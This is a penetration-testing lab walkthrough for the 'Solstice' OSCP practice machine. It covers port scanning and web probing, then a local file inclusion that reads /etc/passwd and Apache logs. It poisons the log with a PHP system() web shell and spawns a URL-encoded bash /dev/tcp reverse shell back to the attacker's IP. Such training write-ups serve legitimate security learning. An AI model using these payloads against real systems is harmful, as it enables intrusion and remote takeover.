# Solstice
OSCP vulnerable machines walkthrough

Command
```
$ nmap -p- -sV -sC $ip --open
```
- -p- : all ports
- -sV : Probe open ports to determine service/version info
- -sC : equivalent to --script=default
- --open : Only show open ports

Result
```
21/tcp    open  ftp        pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.177.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
25/tcp    open  smtp       Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.45.234], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2121/tcp  open  ftp        pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.177.72:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  tcpwrapped

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 107.02 seconds
```

summary
```
21/tcp    open  ftp        pyftpdlib 1.5.6
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 
25/tcp    open  smtp       Exim smtpd
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
2121/tcp  open  ftp        pyftpdlib 1.5.6
3128/tcp  open  http-proxy Squid http proxy 4.6
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
62524/tcp open  tcpwrapped
```

Detect ftp anonymous access
```
$ ftp $ip 2121
Connected to 192.168.61.72
220 pyftpdlib 1.5.6 ready.
Name (192.168.61.72:root): anonymous
331 Username ok, send password.
Password: [anonymous]
230 Login successful
Remote system tyupe is UNIX
Using binary mode to transfer files.
ftp> dir
ftp> bye
```
Inspect ports running http servers.

1. Manual Inspection
2. curl
3. Wfuzz dirbusting/parameter
4. Nikto

port 80 | curl
```
┌──(kali㉿kali)-[~]
└─$ curl -ivkL http://$ip:80                  
*   Trying 192.168.177.72:80...
* Connected to 192.168.177.72 (192.168.177.72) port 80
> GET / HTTP/1.1
> Host: 192.168.177.72
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Apache/2.4.38 (Debian)
< Content-Type: text/html
< 
 <head>
...
</style>
</head>
<body>
    <div class="footer">Proudly powered by phpIPAM 1.4</div>
</body>
```

port 80 | Nikto
```
┌──(kali㉿kali)-[~]
└─$ nikto -h $ip -p 80                    
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.177.72
+ Target Hostname:    192.168.177.72
+ Target Port:        80
+ Start Time:         2024-04-27 03:01:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. 
	See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. 
	This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 128, size: 5a8e9a431c517, mtime: gzip. 		See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). 
	Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /icons/README: Apache default file found. 
	See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-04-27 03:14:33 (GMT-4) (799 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Port 3128
```
┌──(kali㉿kali)-[~]
└─$ curl -ivkL http://$ip:3128
*   Trying 192.168.177.72:3128...
* Connected to 192.168.177.72 (192.168.177.72) port 3128
> GET / HTTP/1.1
> Host: 192.168.177.72:3128
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 400 Bad Request
< Server: squid/4.6
< Mime-Version: 1.0
< Content-Type: text/html;charset=utf-8
< X-Squid-Error: ERR_INVALID_URL 0
< X-Cache: MISS from localhost
< X-Cache-Lookup: NONE from localhost:3128
< Via: 1.1 localhost (squid/4.6)
< Connection: close

        background: url('/squid-internal-static/icons/SN.png') no-repeat left;
```

Port 8593
```
┌──(kali㉿kali)-[~]
└─$ curl -ivkL http://$ip:8593
*   Trying 192.168.177.72:8593...
* Connected to 192.168.177.72 (192.168.177.72) port 8593
> GET / HTTP/1.1
> Host: 192.168.177.72:8593
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< X-Powered-By: PHP/7.3.14-1~deb10u1
< Set-Cookie: PHPSESSID=ui8v5ft1vpgju3hrk9kbl11f5a; path=/
< 
<html>
    <head>
    ...
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?book=list">Book List</a>
        </div>
We are still setting up the library! Try later on!<p></p>    </body>
</html>
```
> [!IMPORTANT]
> Interesting link detected on html document.

**index.php?book=list**

Nikto
```
┌──(kali㉿kali)-[~]
└─$ nikto -h $ip -p 8593
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.177.72
+ Target Hostname:    192.168.177.72
+ Target Port:        8593
+ Start Time:         2024-04-27 03:14:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: Retrieved x-powered-by header: PHP/7.3.14-1~deb10u1.
+ /: The anti-clickjacking X-Frame-Options header is not present. 
	See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. 
	This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. 
	See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.html, /index.php.
+ /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF: Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution. See: https://www.exploit-db.com/exploits/26006
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ /wordpress/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8111 requests: 9 error(s) and 8 item(s) reported on remote host
+ End Time:           2024-04-27 03:40:01 (GMT-4) (1506 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Let's try to exploit directory traversal vulnerability
```
┌──(kali㉿kali)-[~]
└─$ curl  http://$ip:8593/index.php?book=../../../../etc/passwd 
<html>
    <head>
        <link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
        <link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?book=list">Book List</a>
        </div>
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin
smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
</p>    </body>
</html>
```

> [!IMPORTANT]
> Users listed from /etc/passwd file.

Local File Inclusion vulnerabiliy | /var/log/apache2/access.log
```
┌──(kali㉿kali)-[~]
└─$ curl  http://$ip:8593/index.php?book=../../../../var/log/apache2/access.log
....
"-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET http://aws.cirt.net/computeMetadata/v1/project/ HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET http://aws.cirt.net/openstack/latest HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET http://aws.cirt.net/metadata/v1.json HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET http://aws.cirt.net/metadata/instance?api-version=2017-08-01 HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET http://aws.cirt.net/hetzner/v1/metadata/private-networks HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET /graphql HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
192.168.45.234 - - [27/Apr/2024:03:14:32 -0400] "GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
</p>    </body>
</html>

```

Log poisoning with executable code
```
$ nc -nv $ip 80
GET /<?php system($_GET['cmd']); ?>
```
php console command
```
GET /<?php system($_GET['cmd']); ?>
```

console execution
```
http://192.168.177.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=ifconfig
```
> [!IMPORTANT]
> Logs on file /var/log/apache2/access.log are generated accessing http server on port 80 using netcat.
> Executable code planted on logs is executed by retrieving access.log file from http server on port 8593 using a browser.

Get reverse shell command
```
bash -c 'bash -i >& /dev/tcp/192.168.45.234/9090 0>&1'
```
encoded with burpsuite
```
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%33%34%2f%39%30%39%30%20%30%3e%26%31%27
```

full http command with encoded reverse shell command
```
http://192.168.177.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%33%34%2f%39%30%39%30%20%30%3e%26%31%27
```
Run ncat to get reverse shell
```
$ nc -nlvp 9090
```
Stable shell
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

Nmap
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -p 8593 --script "vuln" $ip                              
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-27 04:21 EDT
Nmap scan report for 192.168.177.72
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
8593/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| vulners: 
|   PHP cli server 5.5 or later: 
|       CVE-2021-43837  9.0     https://vulners.com/cve/CVE-2021-43837
|       CVE-2021-29504  7.5     https://vulners.com/cve/CVE-2021-29504
|       CVE-2021-21403  7.5     https://vulners.com/cve/CVE-2021-21403
|       CVE-2011-1939   7.5     https://vulners.com/cve/CVE-2011-1939
|       ZSL-2017-5393   6.8     https://vulners.com/zeroscience/ZSL-2017-5393   *EXPLOIT*
|       CVE-2021-21420  6.8     https://vulners.com/cve/CVE-2021-21420
|       CVE-2017-20120  6.8     https://vulners.com/cve/CVE-2017-20120
|       CVE-2014-3622   6.8     https://vulners.com/cve/CVE-2014-3622
|       CVE-2024-24824  6.5     https://vulners.com/cve/CVE-2024-24824
|       CVE-2023-38702  6.5     https://vulners.com/cve/CVE-2023-38702
|       CVE-2022-39395  6.5     https://vulners.com/cve/CVE-2022-39395
|       CVE-2022-39295  5.8     https://vulners.com/cve/CVE-2022-39295
|       CVE-2017-20119  5.8     https://vulners.com/cve/CVE-2017-20119
|       CVE-2024-2406   5.5     https://vulners.com/cve/CVE-2024-2406
|       CVE-2023-41045  5.0     https://vulners.com/cve/CVE-2023-41045
|       CVE-2021-41092  5.0     https://vulners.com/cve/CVE-2021-41092
|       CVE-2010-4657   5.0     https://vulners.com/cve/CVE-2010-4657
|       CVE-2022-46181  4.9     https://vulners.com/cve/CVE-2022-46181
|       CVE-2023-41044  4.7     https://vulners.com/cve/CVE-2023-41044
|       CVE-2022-24753  4.4     https://vulners.com/cve/CVE-2022-24753
|       CVE-2023-37472  4.0     https://vulners.com/cve/CVE-2023-37472
|       CVE-2023-36819  4.0     https://vulners.com/cve/CVE-2023-36819
|       CVE-2015-10003  4.0     https://vulners.com/cve/CVE-2015-10003
|       CVE-2024-24823  3.6     https://vulners.com/cve/CVE-2024-24823
|       CVE-2021-21432  3.5     https://vulners.com/cve/CVE-2021-21432
|       CVE-2017-20118  3.5     https://vulners.com/cve/CVE-2017-20118
|       CVE-2017-20117  3.5     https://vulners.com/cve/CVE-2017-20117
|       CVE-2017-20116  3.5     https://vulners.com/cve/CVE-2017-20116
|       CVE-2017-20115  3.5     https://vulners.com/cve/CVE-2017-20115
|       CVE-2017-20114  3.5     https://vulners.com/cve/CVE-2017-20114
|       CVE-2017-20113  3.5     https://vulners.com/cve/CVE-2017-20113
|       CVE-2023-41041  2.1     https://vulners.com/cve/CVE-2023-41041
|       CVE-2020-15095  1.9     https://vulners.com/cve/CVE-2020-15095
|       9D5F343F-2638-5C6B-A8F3-C5D16A393ABE    1.9     https://vulners.com/githubexploit/9D5F343F-2638-5C6B-A8F3-C5D16A393ABE  *EXPLOIT*
|_      CVE-2024-25129  1.2     https://vulners.com/cve/CVE-2024-25129
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 548.75 seconds
```

